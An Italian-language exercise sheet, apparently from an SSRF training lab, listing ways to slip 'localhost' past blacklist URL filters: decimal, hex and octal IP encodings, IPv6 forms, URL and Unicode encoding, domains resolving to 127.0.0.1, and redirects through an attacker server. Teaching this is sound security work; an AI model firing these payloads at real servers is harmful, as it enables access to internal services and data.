🔓 Esercizio 4: Bypass dei Filtri

I filtri blacklist sono quasi sempre bypassabili
🔢 Encoding IP
127.0.0.1 può essere scritto in molti modi:
# Decimal (intero) http://2130706433 # Hexadecimal http://0x7f000001 # Octal http://0177.0.0.1 # Mixed http://127.0.0.0x1 # Shortened http://127.1
🌐 IPv6
Molti filtri controllano solo IPv4:
# IPv6 localhost http://[::1] # IPv6 expanded http://[0:0:0:0:0:0:0:1] # IPv6 mapped IPv4 http://[::ffff:127.0.0.1] # IPv6 con porta http://[::1]:80
🔄 URL Encoding
# URL encoding http://127.0.0.%31 # Double encoding http://127.0.0.%2531 # Unicode http://127。0。0。1
🌍 DNS Rebinding
Domini che risolvono a localhost:
# Servizi DNS speciali http://localtest.me http://127.0.0.1.nip.io http://spoofed.burpcollaborator.net # Il tuo dominio con A record 127.0.0.1
⚠️ Redirect Bypass
Se il filtro controlla solo l'URL iniziale, usa un redirect: http://tuoserver.com/redirect?url=http://127.0.0.1 Il server segue il redirect e raggiunge localhost!
